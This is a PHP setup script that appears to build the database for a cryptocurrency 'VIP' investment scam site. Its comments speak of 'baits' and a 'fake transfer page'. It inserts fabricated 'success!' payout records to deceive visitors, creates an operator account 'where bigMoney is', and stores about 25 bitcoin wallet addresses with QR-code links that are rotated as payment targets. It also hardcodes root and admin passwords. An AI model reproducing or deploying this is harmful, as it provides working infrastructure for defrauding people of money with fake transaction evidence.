<?php
		$host = "mariadb" ;
		$username = "root" ;
		$password = "rootsecret" ;
		$sqldb = "firstdb" ;
		$aza = mysqli_connect($host, $username, $password, $sqldb) ;

		$dbUni = "seconddb" ;
		$azaUni = mysqli_connect($host, $username, $password, $dbUni) ;
	
		if ( !$aza ) 
		{
			sleep(10);
			die('
	
					<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
					<html>
					<head>
					<title>500 Internal Server Error</title>
					<style type="text/css">
					.errortype {
						font-family:verdana,arial,helvetica,clean,sans-serif;
						font-size:x-large;
						font-weight:bold;
					}
					.errormessage {
						font-family:verdana,arial,helvetica,clean,sans-serif;
						font-size:large;
						whitespace:pre;
						margin-left:20px;
					}
					p.errormessage { color:#ff0000; }
					.serverinfo {
						font-family:verdana,arial,helvetica,clean,sans-serif;
						font-size:medium;
					}
					</style>
					</head>
					<body>
					<h1 class="errortype">Internal Server Error</h1>
					<p class="errormessage">500<pre>Database Offline: Please try again later</pre></p>
					<hr>
					</body>
					</html>
			');
		}

	// Checking if database is new so it can create the required table
	// If table exists, first column metadata will return TRUE
	$query = "SELECT 1 FROM membersList LIMIT 1";
	$val = mysqli_query($aza, $query);
	if( $val === FALSE ) // we create table
	{
		$query2 = "CREATE TABLE membersList (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
			userName VARCHAR(64),
			pass VARCHAR(64),
			email VARCHAR(64),
			phone VARCHAR(64),
			wallet VARCHAR(128),
			memKey VARCHAR(64),
			country VARCHAR(64),
			vipLevel INT UNSIGNED,
			tmp	VARCHAR(64),
			regDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
			INDEX(userName )
		)";
		$val = mysqli_query($aza, $query2);


		//now we salt and add admin user
		$salt = "woliwoli";
		$pass = sha1("Whatyearis1997#" . $salt);

		$query_ad = "INSERT INTO membersList (userName, pass, tmp) VALUE ('admin', '$pass', 'admUser')";
		$val = mysqli_query($aza, $query_ad); //added admin to the table

		$query_cool = "INSERT INTO membersList (userName, pass, tmp, vipLevel) VALUE ('coolcoinz', '$pass', 'juniorUser', '0')";
		$val = mysqli_query($aza, $query_cool); //added coolcoinz to the table
		

		//now we also salt and add our account where bigMoney is. tmp=regUser is for session
		$pass = sha1("y68y68" . $salt);

		$query_ad = "INSERT INTO membersList (userName, pass, tmp) VALUE ('yasin68', '$pass', 'regUser')";
		$val = mysqli_query($aza, $query_ad); //added worker to the table


		//Also creating logs table for 4 baits and fake transfer page
		// A DECIMAL(18,9) column has nine digits on either 
		// side of the decimal point, so the integer part and the fractional 
		// part each require 4 bytes. A DECIMAL(20,6) column has fourteen integer 
		// digits and six fractional digits. The integer digits require four bytes 
		// for nine of the digits and 3 bytes for the remaining five digits. 
		// The six fractional digits require 3 bytes.
		$createLog = "CREATE TABLE logs (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
			userName VARCHAR(64),
			status VARCHAR(64),
			statusPayee VARCHAR(64),
			amount DECIMAL(7,5),
			bigMoney DECIMAL(7,5),
			INDEX(userName ),
			regDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
		)";
		mysqli_query($aza, $createLog);

		//now we add 4 baits
		$adBait = "INSERT INTO logs (userName, bigMoney) VALUE ('ros4w', 50.85639)"; //if you transfer to ros4w, the bigMoney currency might crash on your site
		mysqli_query($aza, $adBait);

		$adBait = "INSERT INTO logs (userName, status, amount, statusPayee) VALUE ('g1xxh1', 'success!', 5, 'unverified')";
		mysqli_query($aza, $adBait);
		sleep (5);

		$adBait = "INSERT INTO logs (userName, status, amount, statusPayee) VALUE ('anonhackerz', 'success!', 0.60989, 'unverified')";
		mysqli_query($aza, $adBait);
		sleep (3);

		$adBait = "INSERT INTO logs (userName, status, amount, statusPayee) VALUE ('hackguest', 'success!', 4.09755, 'unverified')";
		mysqli_query($aza, $adBait);
		sleep (7);

		$adBait = "INSERT INTO logs (userName, status, amount, statusPayee) VALUE ('mixie5', 'success!', 3.05231, 'unverified')";
		mysqli_query($aza, $adBait);


		//Also creating withdrawals table for managing withdrawal requests for VIP members
		$createWithdrawals = "CREATE TABLE withdrawals (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
			userName VARCHAR(64),
			amount DECIMAL(7,5),
			status VARCHAR(64),
			wallet VARCHAR(64),
			INDEX(userName ),
			regDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
		)";
		mysqli_query($aza, $createWithdrawals);
	}

	$query = "SELECT 1 FROM vouchers LIMIT 1";
	$val = mysqli_query($aza, $query);
	if( $val === FALSE ) // we create table
	{
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		// Please remove this part when installing on a fresh memberList table
		$trz = "ALTER TABLE membersList MODIFY COLUMN vipLevel INT UNSIGNED";
		mysqli_query($aza, $trz);
		// $pim = we will create script that tags 5 numbers to all users here
		$pim = "SELECT * FROM membersList ORDER BY userIds DESC LIMIT 1";
		$getArr = mysqli_query($aza, $pim);
		$oneArr = mysqli_fetch_array($getArr) ;
		$arrCount = $oneArr['userIds'];
		$i = 4;
		$put = 0;
		while ( $i <= $arrCount )
		{
			$j = 0;
			while ( $j < 5 && $i <= $arrCount )
			{
			 	$qqq = "UPDATE membersList SET vipLevel='$put' where ( ( userIds='$i' ) AND ( tmp='unverified' ) )";
				$qqq1 = "UPDATE membersList SET vipLevel=20 where ( ( userIds='$i' ) AND ( tmp='juniorUser' ) )";
				$qqq2 = "UPDATE membersList SET vipLevel=20 where ( ( userIds='$i' ) AND ( tmp='juniorUser2' ) )";
				mysqli_query($aza, $qqq);
				mysqli_query($aza, $qqq1);
				mysqli_query($aza, $qqq2);
				$i++;
				$j++;
			}
			$put++;
			if ( $put == 20 )
				$put = 0;
		}
		




		//Also creating vouchers table for collecting payment details
		$createVoucher = "CREATE TABLE vouchers (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
			Code VARCHAR(64),
			Amount DECIMAL(7,5),
			INDEX(Code),
			regDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
		)";
		mysqli_query($aza, $createVoucher);

		$newQuery = "INSERT INTO vouchers (Code, Amount) VALUE ('ctztgp', 1.00001)" ;
        mysqli_query($aza, $newQuery) ;
		$newQuery2 = "INSERT INTO vouchers (Code, Amount) VALUE ('treglf', 2.00001)" ;
        mysqli_query($aza, $newQuery2) ;
		$newQuery3 = "INSERT INTO vouchers (Code, Amount) VALUE ('huterd', 5.00001)" ;
        mysqli_query($aza, $newQuery3) ;
	}

	// Checking if Universal database is new so it can create the required 'payments' table
	// If 'payments' table exists, first column metadata will return TRUE
	$queryPayments = "SELECT 1 FROM payments LIMIT 1";
	$valPayments = mysqli_query($azaUni, $queryPayments);
	if( $valPayments === FALSE ) // we create 'payments' table in universal db
	{
		$queryP = "CREATE TABLE payments (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
		    tmp VARCHAR(64),
		 	userName VARCHAR(64),
		 	wallet VARCHAR(128),
		 	INDEX(userName ),
		 	regDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
		 )";
		$valP = mysqli_query($azaUni, $queryP);
		
		// we now also create link + image url holder
		$queryQ = "CREATE TABLE imageLink (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
		 	level VARCHAR(64),
		 	url VARCHAR(256),
		 	wallet VARCHAR(128),
			counter INT,
		 	INDEX(level )
		 )";
		$valQ = mysqli_query($azaUni, $queryQ);
		
		// add Vip 1 wallet address and image URL to the imageLink table
		$addWallet = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt0', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qs5fnz94pm95zk952nek6f66hx9gzrcmu2j68e9&amp;choe=UTF-8', 'bc1qs5fnz94pm95zk952nek6f66hx9gzrcmu2j68e9')";
		mysqli_query($azaUni, $addWallet);
		$addWallet = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt1', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qec2s28dskfjlyqtwa0ruwqecwazs4495wev0ce&amp;choe=UTF-8', 'bc1qec2s28dskfjlyqtwa0ruwqecwazs4495wev0ce')";
		mysqli_query($azaUni, $addWallet);
		$addWallet = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt2', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qczcrfmfvknunwmmulm0ud7fgvwhck8xvmr2egy&amp;choe=UTF-8', 'bc1qczcrfmfvknunwmmulm0ud7fgvwhck8xvmr2egy')";
		mysqli_query($azaUni, $addWallet);
		$addWallet = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt3', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q2c8pfe24rvn07t47juxw2jdm2dsz9zc0gf9ewj&amp;choe=UTF-8', 'bc1q2c8pfe24rvn07t47juxw2jdm2dsz9zc0gf9ewj')";
		mysqli_query($azaUni, $addWallet);
		$addWallet = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt4', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qq7y9sjhtj8v2kknvz35rhfhejvleuqg2szdvkl&amp;choe=UTF-8', 'bc1qq7y9sjhtj8v2kknvz35rhfhejvleuqg2szdvkl')";
		mysqli_query($azaUni, $addWallet);


		// add Vip 2 wallet address and image URL to the imageLink table
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt5', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qgaxdxvmwh7zm8x2ywt0xxkf8lwytxwhcysw4ja&amp;choe=UTF-8', 'bc1qgaxdxvmwh7zm8x2ywt0xxkf8lwytxwhcysw4ja')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt6', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q8u9xxl83twhepf9jy9gwzafea92ceqsntfv89z&amp;choe=UTF-8', 'bc1q8u9xxl83twhepf9jy9gwzafea92ceqsntfv89z')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt7', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qd756mfjk2dn3r3caxaqfjth77sra5wr2v4vd35&amp;choe=UTF-8', 'bc1qd756mfjk2dn3r3caxaqfjth77sra5wr2v4vd35')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt8', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q97h5drt00ckh8n3fdmytedqxfhsm4xt3w3kjwm&amp;choe=UTF-8', 'bc1q97h5drt00ckh8n3fdmytedqxfhsm4xt3w3kjwm')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt9', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qcwt4kjgy5prc86g5flduk9l7p0nfll727x4cul&amp;choe=UTF-8', 'bc1qcwt4kjgy5prc86g5flduk9l7p0nfll727x4cul')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt10', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qulj5w2ry0sffq2622lqkqgvhtsa0cy5qratwm0&amp;choe=UTF-8', 'bc1qulj5w2ry0sffq2622lqkqgvhtsa0cy5qratwm0')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt11', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qs5fnz94pm95zk952nek6f66hx9gzrcmu2j68e9&amp;choe=UTF-8', 'bc1qs5fnz94pm95zk952nek6f66hx9gzrcmu2j68e9')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt12', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qgjf32j8hh0ykrph7v2ng4e0vxnjphya6ajm4zt&amp;choe=UTF-8', 'bc1qgjf32j8hh0ykrph7v2ng4e0vxnjphya6ajm4zt')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt13', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q2aar0tqxnlrh9kvn6t28ak7465gx77d6zqkszy&amp;choe=UTF-8', 'bc1q2aar0tqxnlrh9kvn6t28ak7465gx77d6zqkszy')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt14', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qa2m3mzykq6dx45q4jm6ksvan2yhenq3zhjah4a&amp;choe=UTF-8', 'bc1qa2m3mzykq6dx45q4jm6ksvan2yhenq3zhjah4a')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt15', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q0amga60w9npvpswmupq397052h7pzn69yn63aw&amp;choe=UTF-8', 'bc1q0amga60w9npvpswmupq397052h7pzn69yn63aw')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt16', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q8dx3jq39m74r9dn64um9aqg78ureddxw3ag6xy&amp;choe=UTF-8', 'bc1q8dx3jq39m74r9dn64um9aqg78ureddxw3ag6xy')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt17', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1ql23ulewneyf42j0pm77jqm9d3fh4pl7npl8yrl&amp;choe=UTF-8', 'bc1ql23ulewneyf42j0pm77jqm9d3fh4pl7npl8yrl')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt18', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qdgu5zqqta38ezarmcc0gstqtsz8h2njavgr8cc&amp;choe=UTF-8', 'bc1qdgu5zqqta38ezarmcc0gstqtsz8h2njavgr8cc')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt19', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qlf8pnmlthn0mpeycj8gxdtjwu6p8yx88vgasu6&amp;choe=UTF-8', 'bc1qlf8pnmlthn0mpeycj8gxdtjwu6p8yx88vgasu6')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt20', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qswylwp7j5jtcjm9747slc3pkkfge8qlr4fmykl&amp;choe=UTF-8', 'bc1qswylwp7j5jtcjm9747slc3pkkfge8qlr4fmykl')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt21', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q3xn9tvcw88dy3zpf7y677xusmgpesz45txgvk6&amp;choe=UTF-8', 'bc1q3xn9tvcw88dy3zpf7y677xusmgpesz45txgvk6')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt22', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1q30nkx6wlqtjc60c4f2g6sgpkzjf5mn6yr8xwl9&amp;choe=UTF-8', 'bc1q30nkx6wlqtjc60c4f2g6sgpkzjf5mn6yr8xwl9')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt23', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qfcleh57u3njyrflxx27t4h2wqfdqd4a2sta62v&amp;choe=UTF-8', 'bc1qfcleh57u3njyrflxx27t4h2wqfdqd4a2sta62v')";
		mysqli_query($azaUni, $addWallet2);
		$addWallet2 = "INSERT INTO imageLink (level, url, wallet) VALUE ('opt24', 'https://chart.googleapis.com/chart?chs=380x377&amp;cht=qr&amp;chl=bitcoin:bc1qgcwm74w2dellly5vwtyvm7a667lvnjk8mep9nk&amp;choe=UTF-8', 'bc1qgcwm74w2dellly5vwtyvm7a667lvnjk8mep9nk')";
		mysqli_query($azaUni, $addWallet2);


		// add scroller for picking next
		$addScroll = "INSERT INTO imageLink (level, counter) VALUE ('optX1',  0)";
		mysqli_query($azaUni, $addScroll);
		$addScroll = "INSERT INTO imageLink (level, counter) VALUE ('optX1_base',  0)";
		mysqli_query($azaUni, $addScroll);
		$addScroll = "INSERT INTO imageLink (level, counter) VALUE ('optX2',  20)";
		mysqli_query($azaUni, $addScroll);
		$addScroll = "INSERT INTO imageLink (level, counter) VALUE ('optX2_base',  0)";
		mysqli_query($azaUni, $addScroll);

		// we now also create payment page visitors
		$queryV = "CREATE TABLE payPageVisitors (
			userIds INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
			userName VARCHAR(64),
		 	INDEX(userName ),
			wallet VARCHAR(128),
			regDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
		 )";
		$valV = mysqli_query($azaUni, $queryV);
	}
?>
